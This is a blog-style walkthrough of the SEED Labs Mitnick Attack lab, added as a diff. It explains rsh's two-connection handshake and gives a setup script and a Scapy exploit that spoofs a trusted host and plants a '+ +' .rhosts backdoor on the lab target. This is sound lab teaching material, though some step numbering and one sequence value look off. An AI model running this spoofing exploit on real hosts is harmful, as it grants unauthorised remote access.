@@ -1,0 +1,361 @@
+---
+title: 'A guide to Seed lab - Mitnick Attack'
+date: '2025-11-13'
+lastmod: '2025-11-13'
+tags: ['Mitnick Attack' , 'TCP' , 'TCP Hijacking', 'seed lab', 'guide']
+draft: false
+images: []
+summary: 'A detailed writeup for The famouse mitnick Attack on TCP Hijacking'
+authors: ['default']
+---
+
+
+
+# SEED Labs — The Mitnick Attack Lab — Step-by-step Writeup
+
+
+This is detailed writeup on Seed labs - Mitnick attack . 
+
+Download the lab files and manual:
+
+[Lab zip file][lab_zip]   
+[Lab manual][lab_manual]
+
+[lab_zip]: https://seedsecuritylabs.org/Labs_20.04/Files/Mitnick_Attack/Labsetup.zip
+[lab_manual]: https://seedsecuritylabs.org/Labs_20.04/Files/Mitnick_Attack/Mitnick_Attack.pdf
+
+
+---
+
+## Lab prerequisites 
+
+* Dockers
+* Python
+* Scapy
+---
+
+## Environment summary 
+
+In the zip file from the website we are given docker-compose file , volume(a shared folder where our exploit will lie) and docker file inside ubuntu image folder. 
+To setup our docker container we need to run 
+
+```bash
+docker compose build 
+docker compose up -d #-d to run them in background 
+docker compose down #to stop if want to 
+```
+
+After runnign this command we will have 3 containers running we can see by 
+
+```bash
+docker ps -a 
+```
+
+* X-Terminal (target): `10.9.0.5`
+* Trusted Server (spoofed): `10.9.0.6`
+* Attacker: `10.9.0.1`
+
+---
+
+## Setup  
+
+### 1) Prepare X-Terminal and Trusted Server state
+
+* Ensure X-Terminal has a `.rhosts` file owned by `seed` with permissive read by owner and group/world read disabled for writing:
+
+```bash
+# on X-Terminal (as root)
+su seed
+cd
+# create .rhosts with trusted server entry (used for initial testing only)
+echo "10.9.0.6" > .rhosts
+chmod 644 .rhosts
+```
+
+* Verify `rsh` works from the Trusted Server (before silencing it):
+
+```bash
+# on Trusted Server
+su seed
+rsh 10.9.0.5 date     # should print date if trust works
+```
+
+### 2) Silence the Trusted Server (simulate SYN-flood or simply stop it)
+
+* To avoid the Trusted Server replying with RST to X-Terminal's unsolicited SYN+ACK, the lab approach is to take it offline:
+
+```bash
+# run on the host/compose controller
+docker rm trusted-server-10.9.0.6 -f
+```
+
+* Ensure X-Terminal can still resolve the MAC for 10.9.0.6. Either ping once from X-Terminal before stopping the host, or add a static ARP entry:
+
+```bash
+# on X-Terminal (as root)
+arp -s 10.9.0.6 <TRUSTED_MAC>
+
+```
+---
+## Understanding 
+To exploit First we have to understand how rsh is working 
+lets run simple command from our trusted server and sniff the trrafic from wireshark 
+
+```
+rsh 10.9.0.5 date 
+```
+the wireshark shows following packets 
+
+```
+
+# The first connection
+SRC IP DEST IP TCP Header
+1 10.9.0.6 10.9.0.5 1023 -> 514 [SYN] Seq=778933536
+2 10.9.0.5 10.9.0.6 514 -> 1023 [SYN,ACK] Seq=10879102 Ack=778933537
+3 10.9.0.6 10.9.0.5 1023 -> 514 [ACK] Seq=778933537 Ack=10879103
+4 10.9.0.6 10.9.0.5 1023 -> 514 [ACK] Seq=778933537 Ack=10879103 Len=20
+    RSH Session Establishment
+    Data: 1022\x00seed\x00seed\x00date\x00
+5 10.9.0.5 10.9.0.6 514 -> 1023 [ACK] Seq=10879103 Ack=778933557
+# The second connection
+6 10.9.0.5 10.9.0.6 1023 -> 1022 [SYN] Seq=3920611526
+7 10.9.0.6 10.9.0.5 1022 -> 1023 [SYN,ACK] Seq=3958269143 Ack=3920611527
+8 10.9.0.5 10.9.0.6 1023 -> 1022 [ACK] Seq=3920611527 Ack=3958269144
+# Going back to the first connection
+9 10.9.0.5 10.9.0.6 514 -> 1023 [ACK] Seq=10879103 Ack=778933557 Len=1
+    Data: \x00
+10 10.9.0.6 10.9.0.5 1023 -> 514 [ACK] Seq=778933557 Ack=10879104
+11 10.9.0.5 10.9.0.6 514 -> 1023 [ACK] Seq=10879104 Ack=778933557 Len=29
+Data: Sun Feb 16 13:41:17 EST 2020
+
+```
+Here we can see 2 tcp handshake are being established (why : in old unix system dev's tried to seperate the stdout from stderr so first conn is for stdout and second for stderr , but we must complete both to handshakes to complete our attack). After first handshake complete we send our command which was 'date' in this scenerio and after second handshake we we receive our response to the command .Now lets exploit it using the same packet structure we can develop our exploit 
+
+---
+## Exploit
+### 1) Sniff for the SYN+ACK
+
+* From the attacker, send a spoofed SYN with source IP `10.9.0.6` and source port `1023` to `10.9.0.5:514`. X-Terminal will reply with SYN+ACK to `10.9.0.6` — you must sniff that packet to obtain the ISN.
+
+Tools: `scapy`'s `sniff()` on the attacker interface.
+
+### 2) Complete the first handshake (spoofed ACK)
+
+* Use the ISN obtained in step 3 and craft a spoofed ACK with:
+
+  * `IP(src=10.9.0.6, dst=10.9.0.5)`
+  * `TCP(sport=1023, dport=514, flags='A', seq=<your_seq>, ack=<their_isn+1>)`
+
+`<your_seq>` should be the sequence number you'd have sent in the SYN (typically SYN seq + 1), and `ack` must be `syn_ack.seq + 1`.
+
+### 4) Send the RSH payload (single data packet)
+
+* The rsh payload format is: `[port]\x00[client_user]\x00[server_user]\x00[command]\x00`
+* Example payload to plant backdoor for `seed`:
+
+```
+"1022\x00seed\x00seed\x00echo '+ +' > /home/seed/.rhosts\x00"
+```
+
+* Send it on the first connection using a `PUSH+ACK` packet (flags `PA`) with the correct sequence numbers.
+
+### 5) Sniff for X-Terminal's second connection attempt
+
+* After receiving the rsh payload, X-Terminal will initiate a second connection to the client port specified (1022). Sniff that SYN so you know `pkt[TCP].sport` the client (X-Terminal) used for the second handshake.
+### 6) Spoof the second connection (SYN+ACK + final ACK)
+
+* Respond with a spoofed `SYN+ACK` from `10.9.0.6:1022` to X-Terminal's connecting ephemeral port, then send the final ACK. If done correctly, `rshd` will proceed to execute the command.
+
+### 7) Verify the backdoor
+
+* On X-Terminal:
+
+```bash
+cat /home/seed/.rhosts   # should contain "+ +"
+```
+
+* From attacker (or any host):
+
+```bash
+rsh 10.9.0.5 whoami  # should return 'seed'
+```
+
+---
+## Scripts 
+
+## setup.sh — quick setup script (will setup your dockers and open 3 terminals)
+
+> **Purpose:** automates the pre-attack steps: bring down trusted server, prepare .rhosts on X-Terminal (if desired), add static ARP, and open helper terminals.
+
+```bash
+#!/bin/bash
+
+# Start the containers
+docker kill $(docker ps -q)
+
+sleep 0.2
+echo "Starting Docker containers..."
+docker compose up -d
+
+# Give the containers a moment to start up fully
+sleep 3
+
+# Get MAC address of trusted-server-10.9.0.6
+# Extract MAC from docker inspect (ensure correct network and interface)
+TRUSTED_MAC=$(docker inspect trusted-server-10.9.0.6 | \
+              grep -i "MacAddress" -A 1 | \
+              grep -oE "[0-9a-fA-F:]{17}" | \
+              head -n 1)
+
+if [ -z "$TRUSTED_MAC" ]; then
+    echo "Failed to get MAC address of trusted-server-10.9.0.6"
+    exit 1
+fi
+
+echo "Got MAC of trusted-server-10.9.0.6: $TRUSTED_MAC"
+
+# Open terminals
+
+gnome-terminal --title="SEED Attacker" -- bash -c "
+    echo 'Connected to SEED Attacker';
+    docker exec -it seed-attacker bash;
+    exec bash
+"
+
+
+# X-Terminal: Do setup automatically, then stay open
+gnome-terminal --title="X-Terminal (Auto-configured)" -- bash -c "
+    echo 'Configuring X-Terminal...';
+    echo 'Trusted Server IP: 10.9.0.6';
+    echo 'Trusted Server MAC: $TRUSTED_MAC';
+    
+    # Run the required commands inside x-terminal-10.9.0.5
+    docker exec -u root x-terminal-10.9.0.5 bash -c '
+        cd /root &&
+        echo \"10.9.0.6\" > /home/seed/.rhosts &&
+        chmod 644 .rhosts &&
+        echo \" .rhosts updated\"
+    ';
+    
+    # Static ARP entry
+    docker exec -u root x-terminal-10.9.0.5 arp -s 10.9.0.6 $TRUSTED_MAC;
+    echo \"ARP entry set: arp -s 10.9.0.6 $TRUSTED_MAC\";
+    
+    # Show result
+    docker exec -u root x-terminal-10.9.0.5 arp -n;
+    
+    echo 'Setup complete. You are now inside X-Terminal.';
+    echo 'Type commands below or exit to close.';
+    docker exec -it x-terminal-10.9.0.5 bash;
+    exec bash
+"
+
+gnome-terminal --title="SEED Attacker" -- bash -c "
+    echo 'Connected to SEED Attacker';
+    docker exec -it seed-attacker bash;
+    exec bash
+"
+
+sleep 1
+
+docker rm trusted-server-10.9.0.6 -f 
+
+echo "All terminals launched!"
+
+```
+**Notes:**
+* place it in same directory as the docker compose file 
+
+---
+
+## exploit.py
+
+> **Purpose:** Sniff the SYN+ACK (first connection), complete the spoofed handshake, send the RSH payload, sniff the second connection SYN and spoof the second handshake.
+
+
+
+``` python
+#!/usr/bin/env python3
+from scapy.all import *
+
+# Config (MUST match lab)
+x_ip = "10.9.0.5"    # X-Terminal (target)
+srv_ip = "10.9.0.6"  # Trusted Server (impersonated)
+sport = 1023         # rsh client port
+xport = 514          # rshd port
+listen_port = 1022   # for second connection (error channel)
+
+# Step 1: Spoof SYN from trusted server
+print("Sending spoofed SYN...")
+ip = IP(src=srv_ip, dst=x_ip)
+syn = TCP(sport=sport, dport=xport, flags='S', seq=1000)
+syn_ack = sr1(ip/syn, timeout=3)
+if not syn_ack or syn_ack[TCP].flags != 'SA':
+    print("Failed to get SYN+ACK")
+    exit()
+
+# Step 2: Send ACK
+ack = ip/TCP(
+    sport=sport, dport=xport,
+    flags='A',
+    seq=syn_ack[TCP].ack,
+    ack=syn_ack[TCP].seq + 1
+)
+send(ack)
+
+# Step 3: Send rsh payload (as seed user!)
+payload = b'1022\x00seed\x00seed\x00echo "+ +" > /home/seed/.rhosts\x00'
+
+data_pkt = ip/TCP(
+    sport=sport, dport=xport,
+    flags='PA',
+    seq=ack[TCP].seq,
+    ack=ack[TCP].ack
+) / payload
+send(data_pkt)
+
+# Step 4: Wait for SYN for second connection (to port 1022)
+print("Sniffing for SYN on port 1022...")
+def handle_second_conn(pkt):
+    if TCP in pkt and pkt[IP].src == x_ip and pkt[TCP].dport == listen_port and pkt[TCP].flags & 0x02:
+        print("Captured SYN for second connection")
+        # Send SYN+ACK
+        syn_ack2 = IP(src=srv_ip, dst=x_ip)/TCP(
+            sport=listen_port,
+            dport=pkt[TCP].sport,
+            flags='SA',
+            seq=2000,  # arbitrary
+            ack=pkt[TCP].seq + 1
+        )
+        send(syn_ack2)
+        # Send final ACK
+        final_ack = IP(src=srv_ip, dst=x_ip)/TCP(
+            sport=listen_port,
+            dport=pkt[TCP].sport,
+            flags='A',
+            seq=syn_ack2[TCP].ack,
+            ack=syn_ack2[TCP].seq + 1
+        )
+        send(final_ack)
+        print("Second handshake completed. Command should execute now.")
+
+sniff(
+    iface="br-1c70a0fef7a3",
+    filter=f"tcp and src host {x_ip} and dst port {listen_port} and tcp[tcpflags] & tcp-syn != 0",
+    prn=handle_second_conn,
+    count=1,
+    timeout=10
+)
+
+
+```
+
+## Some commands : 
+
+``` bash
+netstat -nat # show a table of open connection or open ports 
+tcpdump -i <interface> # you can specify an interface to listen on 
+ifconfig #to get the list of interfaces your machine have 
+```
+
+# __END__
